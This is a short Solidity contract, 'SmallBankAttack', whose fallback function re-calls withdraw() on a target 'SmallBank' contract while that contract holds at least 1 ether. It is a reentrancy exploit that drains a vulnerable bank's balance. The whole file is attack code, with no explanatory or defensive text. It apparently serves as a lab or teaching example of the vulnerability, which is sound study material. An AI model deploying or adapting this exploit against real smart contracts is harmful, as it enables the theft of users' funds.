// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;


interface SmallBank {
    function withdraw() external;
}

contract SmallBankAttack {
    address smallBankAddress;

    constructor(address _smallBankAddress) payable{
        smallBankAddress = _smallBankAddress;
    }

    fallback() external payable {
        if (smallBankAddress.balance >= 1 ether) {
            SmallBank(smallBankAddress).withdraw();
        }
    }
}